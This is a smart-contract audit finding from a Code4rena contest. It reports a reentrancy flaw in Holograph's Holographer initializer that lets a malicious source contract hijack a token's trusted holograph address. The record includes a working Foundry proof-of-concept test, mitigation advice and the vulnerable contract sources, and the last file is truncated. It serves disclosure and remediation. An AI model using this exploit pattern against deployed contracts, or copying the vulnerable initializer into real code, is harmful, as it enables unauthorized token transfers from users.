{
  "Title": "[M-10] Holographable tokens can be reinitialized",
  "Content": "\nWhen new holographable tokens are created, they typically set a state variable that holds the address of the holograph contract. When creation is done through the `HolographFactory`, the holograph contract is [passed in as a parameter](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/HolographFactory.sol#L252) to the holographable contract's initializer function. Under normal circumstances, this would ensure that the hologrpahable asset stores a trusted holograph contract address in its `_holographSlot`.\n\nHowever, the initializer is vulnerable to reentrancy and the `_holographSlot` can be set to an untrusted contract address. This occurs because before the initialization is complete, the Holographer makes a [delegate call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/Holographer.sol#L162-L164) to a corresponding enforcer contract. From here, the enforcer contract makes an [optional call](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L241) to the source contract in an attempt to intialize it. This call can be used to reenter into the Holographer contract's initialize function before the first one has been completed and overwrite key variables such as the `_adminslot`, the `_holographSlot` and the `_sourceContractSlot`.\n\nOne way in which this becomes problematic is because of how holographed ERC20s perform `transferFrom` calls. Holographed ERC20s by default allow two special addresses to [transfer](https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC20.sol#L527) assets on behalf of other users without an allowance. These addresses are calculated by calling `_holograph().getBridge()` and `_holograph().getOperator()` respectively. With the above described reentrancy issue, `_holograph().getBridge()` and `_holograph().getOperator()` can return arbitrary addresses. This means that newly created holographed ERC20 tokens can be prone to unauthorized transfers. These assets will have been deployed by the HolographFactory and may look and feel like a safe holographable token to users but they can come with a built-in rugpull vector.\n\n### Proof of Concept:\n\n    // SPDX-License-Identifier: UNLICENSED\n    pragma solidity ^0.8.13;\n\n    import \"forge-std/Test.sol\";\n    import \"../contracts/HolographFactory.sol\";\n    import \"../contracts/HolographRegistry.sol\";\n    import \"../contracts/Holograph.sol\";\n    import \"../contracts/enforcer/HolographERC20.sol\";\n\n    //Contract used to show reentrancy in initializer\n    contract SourceContract {\n        address public holographer;\n        MockContract public mc;\n\n        constructor() {\n             mc = new MockContract();\n        }\n\n        //function that reenters the holographer and sets this contract as the new holograph slot\n        function init(bytes memory initPayload) external returns(bytes4) {\n            assembly {\n                sstore(holographer.slot, caller())\n            }\n            bytes memory initCode = abi.encode(abi.encode(uint32(1), address(this), bytes32(\"0xabc\"), address(this)), bytes(\"0x0\")); \n            holographer.call(abi.encodeWithSignature(\"init(bytes)\", initCode));\n            return InitializableInterface.init.selector;\n        }\n\n        function getRegistry() external view returns (address) {\n            return address(this);\n        }\n\n        function getReservedContractTypeAddress(bytes32 contractType) external view returns (address) {\n            return address(mc);\n        }\n\n        function isTheHolograph() external pure returns (bool) {\n            return true;\n        }\n\n    }\n\n    //simple extension contract to return easily during reinitialization\n    contract MockContract {\n        constructor() {}\n\n        function init(bytes memory initPayload) external pure returns(bytes4) {\n            return InitializableInterface.init.selector;\n        }\n    }\n\n    contract HolographTest is Test {\n        DeploymentConfig public config;\n        Verification public verifiedSignature;\n        HolographFactory public hf;\n        HolographRegistry public hr;\n        Holograph public h;\n        HolographERC20 public he20;\n\n        uint256 internal userPrivateKey;\n        address internal hrAdmin;\n        mapping(uint256 => bool) public _burnedTokens;\n        address internal user;\n        function setUp() public {\n            //Creating all of the required objects\n            hf = new HolographFactory();\n            hr = new HolographRegistry();\n            h = new Holograph();\n            he20 = new HolographERC20();\n\n            //Setting up the registry admin\n            hrAdmin = vm.addr(100);\n\n            //Creating factory, holograph, and registry init payloads\n            bytes memory hfInitPayload = abi.encode(address(h), address(hr));\n            hf.init(hfInitPayload);\n            bytes memory hInitPayload = abi.encode(uint32(0),address(1),address(hf),address(1),address(1),address(hr),address(1),address(1));\n            h.init(hInitPayload);\n            bytes32[] memory reservedTypes = new bytes32[](1);\n            reservedTypes[0] = \"0xabc\";\n            bytes memory hrInitPayload = abi.encode(address(h), reservedTypes);\n\n            //Setting up a contract type address for the ERC20 enforcer\n            vm.startPrank(hrAdmin, hrAdmin);\n            hr.init(hrInitPayload);\n            hr.setContractTypeAddress(reservedTypes[0], address(he20));\n            vm.stopPrank();\n\n            //Keys used to sign transaction for deployment\n            userPrivateKey = 0x1337;\n            user = vm.addr(userPrivateKey);\n        }\n\n        function testDeployShadyHolographer() public {\n            //setting up the configuration, contract type is not important\n            config.contractType = \"0xabc\";\n            config.chainType = 1;\n            config.salt = \"0x12345\";\n            config.byteCode = type(SourceContract).creationCode;\n            bytes memory initCode = \"0x123\";\n\n            //giving our token some semi-realistic metadata\n            config.initCode = abi.encode(\"HToken\", \"HT\", uint8(18), uint256(0), \"HTdomainSeparator\", \"HTdomainVersion\", false, initCode);\n\n            //creating the hash for our user to sign\n            bytes32 hash = keccak256(\n                abi.encodePacked(\n                    config.contractType,\n                    config.chainType,\n                    config.salt,\n                    keccak256(config.byteCode),\n                    keccak256(config.initCode),\n                    user\n                ));\n\n            //signing the hash and creating the verified signature\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, hash);\n            verifiedSignature.r = r;\n            verifiedSignature.v = v;\n            verifiedSignature.s = s;\n\n            //deploying our new source contract and holographable contract pair\n            hf.deployHolographableContract(config, verifiedSignature, user);\n\n            //after the reentrancy has affected the initialization, we grab the holographer address from the registry\n            address payable newHolographAsset = payable(hr.getHolographedHashAddress(hash));\n\n            //verify that the _holographSlot in the holographer contract points to our SourceContract and not the trusted holograph contract\n            assertEq(SourceContract(Holographer(newHolographAsset).getHolograph()).isTheHolograph(), true);\n        }\n    }\n\n### Recommended Mitigation Steps\n\nConsider checking whether the contract is in an \"initializing\" phase such as is done in OpenZeppelin's [`Initializable`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/a1948250ab8c441f6d327a65754cb20d2b1b4554/contracts/proxy/utils/Initializable.sol#L83) library to prevent reentrancy during initialization. Additionally, if the bridge and operators are not intended to transfer tokens directly, consider removing the logic that allows them to bypass the allowance requirements.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/215#issuecomment-1295226137):**\n > I think the enforcer should be considered trusted so the risk here is low.\n\n**[alexanderattar (Holograph) confirmed and commented](https://github.com/code-423n4/2022-10-holograph-findings/issues/215#issuecomment-1306712519):**\n > Good observation. `_setInitialized();` needs to be moved higher up the stack before the init call.\n\n**[ACC01ADE (Holograph) linked a PR](https://github.com/code-423n4/2022-10-holograph-findings/issues/215#ref-pullrequest-1452472274):**\n > [Feature/HOLO-605: C4 medium risk fixes](https://github.com/holographxyz/holograph-protocol/pull/88)\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-10-holograph-contest",
  "Code": [
    {
      "filename": "contracts/HolographFactory.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\n/*\n\n                         ┌───────────┐\n                         │ HOLOGRAPH │\n                         └───────────┘\n╔═════════════════════════════════════════════════════════════╗\n║                                                             ║\n║                            / ^ \\                            ║\n║                            ~~*~~            ¸               ║\n║                         [ '<>:<>' ]         │░░░            ║\n║               ╔╗           _/\"\\_           ╔╣               ║\n║             ┌─╬╬─┐          \"\"\"          ┌─╬╬─┐             ║\n║          ┌─┬┘ ╠╣ └┬─┐       \\_/       ┌─┬┘ ╠╣ └┬─┐          ║\n║       ┌─┬┘ │  ╠╣  │ └┬─┐           ┌─┬┘ │  ╠╣  │ └┬─┐       ║\n║    ┌─┬┘ │  │  ╠╣  │  │ └┬─┐     ┌─┬┘ │  │  ╠╣  │  │ └┬─┐    ║\n║ ┌─┬┘ │  │  │  ╠╣  │  │  │ └┬┐ ┌┬┘ │  │  │  ╠╣  │  │  │ └┬─┐ ║\n╠┬┘ │  │  │  │  ╠╣  │  │  │  │└¤┘│  │  │  │  ╠╣  │  │  │  │ └┬╣\n║│  │  │  │  │  ╠╣  │  │  │  │   │  │  │  │  ╠╣  │  │  │  │  │║\n╠╩══╩══╩══╩══╩══╬╬══╩══╩══╩══╩═══╩══╩══╩══╩══╬╬══╩══╩══╩══╩══╩╣\n╠┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴╬╬┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴╬╬┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴╣\n║               ╠╣                           ╠╣               ║\n║               ╠╣                           ╠╣               ║\n║    ,          ╠╣     ,        ,'      *    ╠╣               ║\n║~~~~~^~~~~~~~~┌╬╬┐~~~^~~~~~~~~^^~~~~~~~~^~~┌╬╬┐~~~~~~~^~~~~~~║\n╚══════════════╩╩╩╩═════════════════════════╩╩╩╩══════════════╝\n     - one protocol, one bridge = infinite possibilities -\n\n\n ***************************************************************\n\n DISCLAIMER: U.S Patent Pending\n\n LICENSE: Holograph Limited Public License (H-LPL)\n\n https://holograph.xyz/licenses/h-lpl/1.0.0\n\n This license governs use of the accompanying software. If you\n use the software, you accept this license. If you do not accept\n the license, you are not permitted to use the software.\n\n 1. Definitions\n\n The terms \"reproduce,\" \"reproduction,\" \"derivative works,\" and\n \"distribution\" have the same meaning here as under U.S.\n copyright law. A \"contribution\" is the original software, or\n any additions or changes to the software. A \"contributor\" is\n any person that distributes its contribution under this\n license. \"Licensed patents\" are a contributor’s patent claims\n that read directly on its contribution.\n\n 2. Grant of Rights\n\n A) Copyright Grant- Subject to the terms of this license,\n including the license conditions and limitations in sections 3\n and 4, each contributor grants you a non-exclusive, worldwide,\n royalty-free copyright license to reproduce its contribution,\n prepare derivative works of its contribution, and distribute\n its contribution or any derivative works that you create.\n B) Patent Grant- Subject to the terms of this license,\n including the license conditions and limitations in section 3,\n each contributor grants you a non-exclusive, worldwide,\n royalty-free license under its licensed patents to make, have\n made, use, sell, offer for sale, import, and/or otherwise\n dispose of its contribution in the software or derivative works\n of the contribution in the software.\n\n 3. Conditions and Limitations\n\n A) No Trademark License- This license does not grant you rights\n to use any contributors’ name, logo, or trademarks.\n B) If you bring a patent claim against any contributor over\n patents that you claim are infringed by the software, your\n patent license from such contributor is terminated with\n immediate effect.\n C) If you distribute any portion of the software, you must\n retain all copyright, patent, trademark, and attribution\n notices that are present in the software.\n D) If you distribute any portion of the software in source code\n form, you may do so only under this license by including a\n complete copy of this license with your distribution. If you\n distribute any portion of the software in compiled or object\n code form, you may only do so under a license that complies\n with this license.\n E) The software is licensed “as-is.” You bear all risks of\n using it. The contributors give no express warranties,\n guarantees, or conditions. You may have additional consumer\n rights under your local laws which this license cannot change.\n To the extent permitted under your local laws, the contributors\n exclude all implied warranties, including those of\n merchantability, fitness for a particular purpose and\n non-infringement.\n\n 4. (F) Platform Limitation- The licenses granted in sections\n 2.A & 2.B extend only to the software or derivative works that\n you create that run on a Holograph system product.\n\n ***************************************************************\n\n*/\n\npragma solidity 0.8.13;\n\nimport \"./abstract/Admin.sol\";\nimport \"./abstract/Initializable.sol\";\n\nimport \"./enforcer/Holographer.sol\";\n\nimport \"./interface/Holographable.sol\";\nimport \"./interface/HolographFactoryInterface.sol\";\nimport \"./interface/HolographRegistryInterface.sol\";\nimport \"./interface/InitializableInterface.sol\";\n\nimport \"./struct/DeploymentConfig.sol\";\nimport \"./struct/Verification.sol\";\n\n/**\n * @title Holograph Factory\n * @author https://github.com/holographxyz\n * @notice Deploy holographable contracts\n * @dev The contract provides methods that allow for the creation of Holograph Protocol compliant smart contracts, that are capable of minting holographable assets\n */\ncontract HolographFactory is Admin, Initializable, Holographable, HolographFactoryInterface {\n  /**\n   * @dev bytes32(uint256(keccak256('eip1967.Holograph.holograph')) - 1)\n   */\n  bytes32 constant _holographSlot = 0xb4107f746e9496e8452accc7de63d1c5e14c19f510932daa04077cd49e8bd77a;\n  /**\n   * @dev bytes32(uint256(keccak256('eip1967.Holograph.registry')) - 1)\n   */\n  bytes32 constant _registrySlot = 0xce8e75d5c5227ce29a4ee170160bb296e5dea6934b80a9bd723f7ef1e7c850e7;\n\n  /**\n   * @dev Constructor is left empty and init is used instead\n   */\n  constructor() {}\n\n  /**\n   * @notice Used internally to initialize the contract instead of through a constructor\n   * @dev This function is called by the deployer/factory when creating a contract\n   * @param initPayload abi encoded payload to use for contract initilaization\n   */\n  function init(bytes memory initPayload) external override returns (bytes4) {\n    require(!_isInitialized(), \"HOLOGRAPH: already initialized\");\n    (address holograph, address registry) = abi.decode(initPayload, (address, address));\n    assembly {\n      sstore(_adminSlot, origin())\n      sstore(_holographSlot, holograph)\n      sstore(_registrySlot, registry)\n    }\n    _setInitialized();\n    return InitializableInterface.init.selector;\n  }\n\n  /**\n   * @notice Deploy holographable contract via bridge request\n   * @dev This function directly forwards the calldata to the deployHolographableContract function\n   *      It is used to allow for Holograph Bridge to make cross-chain deployments\n   */\n  function bridgeIn(\n    uint32, /* fromChain*/\n    bytes calldata payload\n  ) external returns (bytes4) {\n    (DeploymentConfig memory config, Verification memory signature, address signer) = abi.decode(\n      payload,\n      (DeploymentConfig, Verification, address)\n    );\n    HolographFactoryInterface(address(this)).deployHolographableContract(config, signature, signer);\n    return Holographable.bridgeIn.selector;\n  }\n\n  /**\n   * @notice Deploy holographable contract via bridge request\n   * @dev This function directly returns the calldata\n   *      It is used to allow for Holograph Bridge to make cross-chain deployments\n   */\n  function bridgeOut(\n    uint32, /* toChain*/\n    address, /* sender*/\n    bytes calldata payload\n  ) external pure returns (bytes4 selector, bytes memory data) {\n    return (Holographable.bridgeOut.selector, payload);\n  }\n\n  /**\n   * @notice Deploy a holographable smart contract\n   * @dev Using this function allows to deploy smart contracts that have the same address across all EVM chains\n   * @param config contract deployement configurations\n   * @param signature that was created by the wallet that created the original payload\n   * @param signer address of wallet that created the payload\n   */\n  function deployHolographableContract(\n    DeploymentConfig memory config,\n    Verification memory signature,\n    address signer\n  ) external {\n    address registry;\n    address holograph;\n    assembly {\n      holograph := sload(_holographSlot)\n      registry := sload(_registrySlot)\n    }\n    /**\n     * @dev the configuration is encoded and hashed along with signer address\n     */\n    bytes32 hash = keccak256(\n      abi.encodePacked(\n        config.contractType,\n        config.chainType,\n        config.salt,\n        keccak256(config.byteCode),\n        keccak256(config.initCode),\n        signer\n      )\n    );\n    /**\n     * @dev the hash is validated against signature\n     *      this is to guarantee that the original creator's configuration has not been altered\n     */\n    require(_verifySigner(signature.r, signature.s, signature.v, hash, signer), \"HOLOGRAPH: invalid signature\");\n    /**\n     * @dev check that this contract has not already been deployed on this chain\n     */\n    bytes memory holographerBytecode = type(Holographer).creationCode;\n    address holographerAddress = address(\n      uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), hash, keccak256(holographerBytecode)))))\n    );\n    require(!_isContract(holographerAddress), \"HOLOGRAPH: already deployed\");\n    /**\n     * @dev convert hash into uint256 which will be used as the salt for create2\n     */\n    uint256 saltInt = uint256(hash);\n    address sourceContractAddress;\n    bytes memory sourceByteCode = config.byteCode;\n    assembly {\n      /**\n       * @dev deploy the user created smart contract first\n       */\n      sourceContractAddress := create2(0, add(sourceByteCode, 0x20), mload(sourceByteCode), saltInt)\n    }\n    assembly {\n      /**\n       * @dev deploy the Holographer contract\n       */\n      holographerAddress := create2(0, add(holographerBytecode, 0x20), mload(holographerBytecode), saltInt)\n    }\n    /**\n     * @dev initialize the Holographer contract\n     */\n    require(\n      InitializableInterface(holographerAddress).init(\n        abi.encode(abi.encode(config.chainType, holograph, config.contractType, sourceContractAddress), config.initCode)\n      ) == InitializableInterface.init.selector,\n      \"initialization failed\"\n    );\n    /**\n     * @dev update the Holograph Registry with deployed contract address\n     */\n    HolographRegistryInterface(registry).setHolographedHashAddress(hash, holographerAddress);\n    /**\n     * @dev emit an event that on-chain indexers can easily read\n     */\n    emit BridgeableContractDeployed(holographerAddress, hash);\n  }\n\n  /**\n   * @notice Get the Holograph Protocol contract\n   * @dev Used for storing a reference to all the primary modules and variables of the protocol\n   */\n  function getHolograph() external view returns (address holograph) {\n    assembly {\n      holograph := sload(_holographSlot)\n    }\n  }\n\n  /**\n   * @notice Update the Holograph Protocol contract address\n   * @param holograph address of the Holograph Protocol smart contract to use\n   */\n  function setHolograph(address holograph) external onlyAdmin {\n    assembly {\n      sstore(_holographSlot, holograph)\n    }\n  }\n\n  /**\n   * @notice Get the Holograph Registry module\n   * @dev This module stores a reference for all deployed holographable smart contracts\n   */\n  function getRegistry() external view returns (address registry) {\n    assembly {\n      registry := sload(_registrySlot)\n    }\n  }\n\n  /**\n   * @notice Update the Holograph Registry module address\n   * @param registry address of the Holograph Registry smart contract to use\n   */\n  function setRegistry(address registry) external onlyAdmin {\n    assembly {\n      sstore(_registrySlot, registry)\n    }\n  }\n\n  /**\n   * @dev Internal function used for checking if a contract has been deployed at address\n   */\n  function _isContract(address contractAddress) private view returns (bool) {\n    bytes32 codehash;\n    assembly {\n      codehash := extcodehash(contractAddress)\n    }\n    return (codehash != 0x0 && codehash != 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470);\n  }\n\n  /**\n   * @dev Internal function used for verifying a signature\n   */\n  function _verifySigner(\n    bytes32 r,\n    bytes32 s,\n    uint8 v,\n    bytes32 hash,\n    address signer\n  ) private pure returns (bool) {\n    if (v < 27) {\n      v += 27;\n    }\n    /**\n     * @dev signature is checked against EIP-191 first, then directly, to support legacy wallets\n     */\n    return (ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)), v, r, s) == signer ||\n      ecrecover(hash, v, r, s) == signer);\n  }\n\n  /**\n   * @dev Purposefully reverts to prevent having any type of ether transfered into the contract\n   */\n  receive() external payable {\n    revert();\n  }\n\n  /**\n   * @dev Purposefully reverts to prevent any calls to undefined functions\n   */\n  fallback() external payable {\n    revert();\n  }\n}"
    },
    {
      "filename": "contracts/enforcer/Holographer.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\n/*\n\n                         ┌───────────┐\n                         │ HOLOGRAPH │\n                         └───────────┘\n╔═════════════════════════════════════════════════════════════╗\n║                                                             ║\n║                            / ^ \\                            ║\n║                            ~~*~~            ¸               ║\n║                         [ '<>:<>' ]         │░░░            ║\n║               ╔╗           _/\"\\_           ╔╣               ║\n║             ┌─╬╬─┐          \"\"\"          ┌─╬╬─┐             ║\n║          ┌─┬┘ ╠╣ └┬─┐       \\_/       ┌─┬┘ ╠╣ └┬─┐          ║\n║       ┌─┬┘ │  ╠╣  │ └┬─┐           ┌─┬┘ │  ╠╣  │ └┬─┐       ║\n║    ┌─┬┘ │  │  ╠╣  │  │ └┬─┐     ┌─┬┘ │  │  ╠╣  │  │ └┬─┐    ║\n║ ┌─┬┘ │  │  │  ╠╣  │  │  │ └┬┐ ┌┬┘ │  │  │  ╠╣  │  │  │ └┬─┐ ║\n╠┬┘ │  │  │  │  ╠╣  │  │  │  │└¤┘│  │  │  │  ╠╣  │  │  │  │ └┬╣\n║│  │  │  │  │  ╠╣  │  │  │  │   │  │  │  │  ╠╣  │  │  │  │  │║\n╠╩══╩══╩══╩══╩══╬╬══╩══╩══╩══╩═══╩══╩══╩══╩══╬╬══╩══╩══╩══╩══╩╣\n╠┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴╬╬┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴╬╬┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴╣\n║               ╠╣                           ╠╣               ║\n║               ╠╣                           ╠╣               ║\n║    ,          ╠╣     ,        ,'      *    ╠╣               ║\n║~~~~~^~~~~~~~~┌╬╬┐~~~^~~~~~~~~^^~~~~~~~~^~~┌╬╬┐~~~~~~~^~~~~~~║\n╚══════════════╩╩╩╩═════════════════════════╩╩╩╩══════════════╝\n     - one protocol, one bridge = infinite possibilities -\n\n\n ***************************************************************\n\n DISCLAIMER: U.S Patent Pending\n\n LICENSE: Holograph Limited Public License (H-LPL)\n\n https://holograph.xyz/licenses/h-lpl/1.0.0\n\n This license governs use of the accompanying software. If you\n use the software, you accept this license. If you do not accept\n the license, you are not permitted to use the software.\n\n 1. Definitions\n\n The terms \"reproduce,\" \"reproduction,\" \"derivative works,\" and\n \"distribution\" have the same meaning here as under U.S.\n copyright law. A \"contribution\" is the original software, or\n any additions or changes to the software. A \"contributor\" is\n any person that distributes its contribution under this\n license. \"Licensed patents\" are a contributor’s patent claims\n that read directly on its contribution.\n\n 2. Grant of Rights\n\n A) Copyright Grant- Subject to the terms of this license,\n including the license conditions and limitations in sections 3\n and 4, each contributor grants you a non-exclusive, worldwide,\n royalty-free copyright license to reproduce its contribution,\n prepare derivative works of its contribution, and distribute\n its contribution or any derivative works that you create.\n B) Patent Grant- Subject to the terms of this license,\n including the license conditions and limitations in section 3,\n each contributor grants you a non-exclusive, worldwide,\n royalty-free license under its licensed patents to make, have\n made, use, sell, offer for sale, import, and/or otherwise\n dispose of its contribution in the software or derivative works\n of the contribution in the software.\n\n 3. Conditions and Limitations\n\n A) No Trademark License- This license does not grant you rights\n to use any contributors’ name, logo, or trademarks.\n B) If you bring a patent claim against any contributor over\n patents that you claim are infringed by the software, your\n patent license from such contributor is terminated with\n immediate effect.\n C) If you distribute any portion of the software, you must\n retain all copyright, patent, trademark, and attribution\n notices that are present in the software.\n D) If you distribute any portion of the software in source code\n form, you may do so only under this license by including a\n complete copy of this license with your distribution. If you\n distribute any portion of the software in compiled or object\n code form, you may only do so under a license that complies\n with this license.\n E) The software is licensed “as-is.” You bear all risks of\n using it. The contributors give no express warranties,\n guarantees, or conditions. You may have additional consumer\n rights under your local laws which this license cannot change.\n To the extent permitted under your local laws, the contributors\n exclude all implied warranties, including those of\n merchantability, fitness for a particular purpose and\n non-infringement.\n\n 4. (F) Platform Limitation- The licenses granted in sections\n 2.A & 2.B extend only to the software or derivative works that\n you create that run on a Holograph system product.\n\n ***************************************************************\n\n*/\n\npragma solidity 0.8.13;\n\nimport \"../abstract/Admin.sol\";\nimport \"../abstract/Initializable.sol\";\n\nimport \"../interface/HolographInterface.sol\";\nimport \"../interface/HolographerInterface.sol\";\nimport \"../interface/HolographRegistryInterface.sol\";\nimport \"../interface/InitializableInterface.sol\";\n\n/**\n * @dev This contract is a binder. It puts together all the variables to make the underlying contracts functional and be bridgeable.\n */\ncontract Holographer is Admin, Initializable, HolographerInterface {\n  /**\n   * @dev bytes32(uint256(keccak256('eip1967.Holograph.originChain')) - 1)\n   */\n  bytes32 constant _originChainSlot = 0xd49ffd6af8249d6e6b5963d9d2b22c6db30ad594cb468453047a14e1c1bcde4d;\n  /**\n   * @dev bytes32(uint256(keccak256('eip1967.Holograph.holograph')) - 1)\n   */\n  bytes32 constant _holographSlot = 0xb4107f746e9496e8452accc7de63d1c5e14c19f510932daa04077cd49e8bd77a;\n  /**\n   * @dev bytes32(uint256(keccak256('eip1967.Holograph.contractType')) - 1)\n   */\n  bytes32 constant _contractTypeSlot = 0x0b671eb65810897366dd82c4cbb7d9dff8beda8484194956e81e89b8a361d9c7;\n  /**\n   * @dev bytes32(uint256(keccak256('eip1967.Holograph.sourceContract')) - 1)\n   */\n  bytes32 constant _sourceContractSlot = 0x27d542086d1e831d40b749e7f5509a626c3047a36d160781c40d5acc83e5b074;\n  /**\n   * @dev bytes32(uint256(keccak256('eip1967.Holograph.blockHeight')) - 1)\n   */\n  bytes32 constant _blockHeightSlot = 0x9172848b0f1df776dc924b58e7fa303087ae0409bbf611608529e7f747d55de3;\n\n  /**\n   * @dev Constructor is left empty and init is used instead\n   */\n  constructor() {}\n\n  /**\n   * @notice Used internally to initialize the contract instead of through a constructor\n   * @dev This function is called by the deployer/factory when creating a contract\n   * @param initPayload abi encoded payload to use for contract initilaization\n   */\n  function init(bytes memory initPayload) external override returns (bytes4) {\n    require(!_isInitialized(), \"HOLOGRAPHER: already initialized\");\n    (bytes memory encoded, bytes memory initCode) = abi.decode(initPayload, (bytes, bytes));\n    (uint32 originChain, address holograph, bytes32 contractType, address sourceContract) = abi.decode(\n      encoded,\n      (uint32, address, bytes32, address)\n    );\n    assembly {\n      sstore(_adminSlot, caller())\n      sstore(_blockHeightSlot, number())\n      sstore(_contractTypeSlot, contractType)\n      sstore(_holographSlot, holograph)\n      sstore(_originChainSlot, originChain)\n      sstore(_sourceContractSlot, sourceContract)\n    }\n    (bool success, bytes memory returnData) = HolographRegistryInterface(HolographInterface(holograph).getRegistry())\n      .getReservedContractTypeAddress(contractType)\n      .delegatecall(abi.encodeWithSignature(\"init(bytes)\", initCode));\n    bytes4 selector = abi.decode(returnData, (bytes4));\n    require(success && selector == InitializableInterface.init.selector, \"initialization failed\");\n    _setInitialized();\n    return InitializableInterface.init.selector;\n  }\n\n  /**\n   * @dev Returns the block height of when the smart contract was deployed. Useful for retrieving deployment config for re-deployment on other EVM-compatible chains.\n   */\n  function getDeploymentBlock() external view returns (address holograph) {\n    assembly {\n      holograph := sload(_blockHeightSlot)\n    }\n  }\n\n  /**\n   * @dev Returns a hardcoded address for the Holograph smart contract.\n   */\n  function getHolograph() external view returns (address holograph) {\n    assembly {\n      holograph := sload(_holographSlot)\n    }\n  }\n\n  /**\n   * @dev Returns a hardcoded address for the Holograph smart contract that controls and enforces the ERC standards.\n   */\n  function getHolographEnforcer() public view returns (address) {\n    HolographInterface holograph;\n    bytes32 contractType;\n    assembly {\n      holograph := sload(_holographSlot)\n      contractType := sload(_contractTypeSlot)\n    }\n    return HolographRegistryInterface(holograph.getRegistry()).getReservedContractTypeAddress(contractType);\n  }\n\n  /**\n   * @dev Returns the original chain that contract was deployed on.\n   */\n  function getOriginChain() external view returns (uint32 originChain) {\n    assembly {\n      originChain := sload(_originChainSlot)\n    }\n  }\n\n  /**\n   * @dev Returns a hardcoded address for the custom secure storage contract deployed in parallel with this contract deployment.\n   */\n  function getSourceContract() external view returns (address sourceContract) {\n    assembly {\n      sourceContract := sload(_sourceContractSlot)\n    }\n  }\n\n  /**\n   * @dev Purposefully left empty, to prevent running out of gas errors when receiving native token payments.\n   */\n  receive() external payable {}\n\n  /**\n   * @dev This takes the Enforcer's source code, runs it, and uses current address for storage slots.\n   */\n  fallback() external payable {\n    address holographEnforcer = getHolographEnforcer();\n    assembly {\n      calldatacopy(0, 0, calldatasize())\n      let result := delegatecall(gas(), holographEnforcer, 0, calldatasize(), 0, 0)\n      returndatacopy(0, 0, returndatasize())\n      switch result\n      case 0 {\n        revert(0, returndatasize())\n      }\n      default {\n        return(0, returndatasize())\n      }\n    }\n  }\n}"
    },
    {
      "filename": "contracts/enforcer/HolographERC20.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\n/*\n\n                         ┌───────────┐\n                         │ HOLOGRAPH │\n                         └───────────┘\n╔═════════════════════════════════════════════════════════════╗\n║                                                             ║\n║                            / ^ \\                            ║\n║                            ~~*~~            ¸               ║\n║                         [ '<>:<>' ]         │░░░            ║\n║               ╔╗           _/\"\\_           ╔╣               ║\n║             ┌─╬╬─┐          \"\"\"          ┌─╬╬─┐             ║\n║          ┌─┬┘ ╠╣ └┬─┐       \\_/       ┌─┬┘ ╠╣ └┬─┐          ║\n║       ┌─┬┘ │  ╠╣  │ └┬─┐           ┌─┬┘ │  ╠╣  │ └┬─┐       ║\n║    ┌─┬┘ │  │  ╠╣  │  │ └┬─┐     ┌─┬┘ │  │  ╠╣  │  │ └┬─┐    ║\n║ ┌─┬┘ │  │  │  ╠╣  │  │  │ └┬┐ ┌┬┘ │  │  │  ╠╣  │  │  │ └┬─┐ ║\n╠┬┘ │  │  │  │  ╠╣  │  │  │  │└¤┘│  │  │  │  ╠╣  │  │  │  │ └┬╣\n║│  │  │  │  │  ╠╣  │  │  │  │   │  │  │  │  ╠╣  │  │  │  │  │║\n╠╩══╩══╩══╩══╩══╬╬══╩══╩══╩══╩═══╩══╩══╩══╩══╬╬══╩══╩══╩══╩══╩╣\n╠┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴╬╬┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴╬╬┴┴┴┴┴┴┴┴┴┴┴┴┴┴┴╣\n║               ╠╣                           ╠╣               ║\n║               ╠╣                           ╠╣               ║\n║    ,          ╠╣     ,        ,'      *    ╠╣               ║\n║~~~~~^~~~~~~~~┌╬╬┐~~~^~~~~~~~~^^~~~~~~~~^~~┌╬╬┐~~~~~~~^~~~~~~║\n╚══════════════╩╩╩╩═════════════════════════╩╩╩╩══════════════╝\n     - one protocol, one bridge = infinite possibilities -\n\n\n ***************************************************************\n\n DISCLAIMER: U.S Patent Pending\n\n LICENSE: Holograph Limited Public License (H-LPL)\n\n https://holograph.xyz/licenses/h-lpl/1.0.0\n\n This license governs use of the accompanying software. If you\n use the software, you accept this license. If you do not accept\n the license, you are not permitted to use the software.\n\n 1. Definitions\n\n The terms \"reproduce,\" \"reproduction,\" \"derivative works,\" and\n \"distribution\" have the same meaning here as under U.S.\n copyright law. A \"contribution\" is the original software, or\n any additions or changes to the software. A \"contributor\" is\n any person that distributes its contribution under this\n license. \"Licensed patents\" are a contributor’s patent claims\n that read directly on its contribution.\n\n 2. Grant of Rights\n\n A) Copyright Grant- Subject to the terms of this license,\n including the license conditions and limitations in sections 3\n and 4, each contributor grants you a non-exclusive, worldwide,\n royalty-free copyright license to reproduce its contribution,\n prepare derivative works of its contribution, and distribute\n its contribution or any derivative works that you create.\n B) Patent Grant- Subject to the terms of this license,\n including the license conditions and limitations in section 3,\n each contributor grants you a non-exclusive, worldwide,\n royalty-free license under its licensed patents to make, have\n made, use, sell, offer for sale, import, and/or otherwise\n dispose of its contribution in the software or derivative works\n of the contribution in the software.\n\n 3. Conditions and Limitations\n\n A) No Trademark 